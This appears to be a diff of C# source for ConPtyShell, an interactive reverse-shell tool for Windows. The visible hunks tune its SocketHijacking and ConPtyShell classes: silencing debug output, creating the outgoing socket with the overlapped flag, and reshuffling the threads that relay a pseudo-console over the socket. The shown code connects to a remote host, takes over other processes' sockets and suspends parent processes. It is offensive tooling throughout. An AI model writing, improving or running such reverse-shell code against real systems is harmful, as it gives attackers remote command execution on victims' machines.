@@ -728,7 +728,7 @@ public static class SocketHijacking
                 // we prioritize the hijacking of Overlapped sockets
                 if (!IsSocketOverlapped(socketHandle))
                 {
-                    Console.WriteLine("debug: Found a usable socket, but it has not been created with the flag WSA_FLAG_OVERLAPPED, skipping...");
+                    // Console.WriteLine("debug: Found a usable socket, but it has not been created with the flag WSA_FLAG_OVERLAPPED, skipping...");
                     continue;
                 }
                 targetSocketHandle = socketHandle;
@@ -737,7 +737,7 @@ public static class SocketHijacking
             }
             // no Overlapped sockets found, expanding the scope by including also Non-Overlapped sockets
             if (targetSocketHandle == IntPtr.Zero) {
-                Console.WriteLine("debug: No overlapped sockets found. Trying to return also non-overlapped sockets...");
+                // Console.WriteLine("debug: No overlapped sockets found. Trying to return also non-overlapped sockets...");
                 foreach (IntPtr socketHandle in targetProcessSockets)
                 {
                     targetSocketHandle = socketHandle;
@@ -1042,8 +1042,7 @@ public static class ConPtyShell
         }
 
         IntPtr socket = IntPtr.Zero;
-        //socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, WSA_FLAG_OVERLAPPED);
-        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);
+        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, WSA_FLAG_OVERLAPPED);
         SOCKADDR_IN sockinfo = new SOCKADDR_IN();
         sockinfo.sin_family = (short)2;
         sockinfo.sin_addr = inet_addr(host);
@@ -1322,8 +1321,6 @@ public static class ConPtyShell
         Process currentProcess = null;
         Process parentProcess = null;
         Process grandParentProcess = null;
-        Thread thThreadReadPipeWriteSocket;
-        Thread thReadSocketWritePipe;
         if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
             conptyCompatible = true;
         PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
@@ -1429,8 +1426,6 @@ public static class ConPtyShell
         // when the ConPTY is destroyed.
         if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
         if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
-        IsSocketOverlapped = false;
-        upgradeShell = true;
         if (upgradeShell) {
             // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
             if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
@@ -1438,11 +1433,10 @@ public static class ConPtyShell
             if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, 1);
         }
         //Threads have better performance than Tasks
-        thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket, IsSocketOverlapped);
-        thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess, IsSocketOverlapped);
+        Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket, IsSocketOverlapped);
+        Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess, IsSocketOverlapped);
         // wait for the child process until exit
         WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
-        
         //cleanup everything
         thThreadReadPipeWriteSocket.Abort();
         thReadSocketWritePipe.Abort();
